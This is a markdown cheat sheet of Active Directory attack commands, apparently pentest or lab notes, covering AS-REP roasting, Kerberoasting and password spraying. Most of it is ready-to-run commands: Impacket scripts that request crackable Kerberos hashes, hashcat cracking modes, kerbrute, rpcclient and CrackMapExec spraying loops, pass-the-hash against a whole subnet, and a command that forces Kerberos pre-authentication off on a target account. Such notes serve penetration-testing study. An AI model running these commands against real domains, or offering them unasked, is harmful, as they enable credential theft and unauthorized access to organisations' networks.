### AsReproasting
__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
As-reproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 

- Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
- KDC responds with the `PRINCIPAL UNKNOWN` error for invalid usernames.
- Whenever the KDC prompts for Kerberos Pre-Authentication, this means username exists.

> With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
```

```bash
kerbrute userenum --dc-ip $IP -d domain.local users.txt --downgrade
```

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
```

##### Windows
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### Force disable Kerberos Preauth
```powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```


---
### Kerberoasting
Domain-connected services, such as MSSQL, web servers may be connected and issued identifiers that allow Kerberos to authenticate the service account. 
- If a domain user account is compromised, then that account can request kerberoastable account names and their _TGS_
- A Kerberoastable account is one that has an SPN set.
- In order to request SPNs, a domain account is needed to make the query.

```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
```

```bash
hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
```

---
### Password Spraying
|Tool|Ports|
|-|-|
|nmblookup|137/UDP|
|nbtstat|137/UDP|
|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
|rpcclient|135/TCP|
|smbclient|445/TCP|

__rpcclient__
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```

__Kerbrute__
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
```

__CrackMapExec__
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

__Local Admin Spraying__
- `--local-auth` flag will tell the tool only to attempt to _log in one time_ on each machine
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

__[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)__
- Automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out.
```powershell
Invoke-DomainPasswordSpray -Password Spring2017
```
```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

---
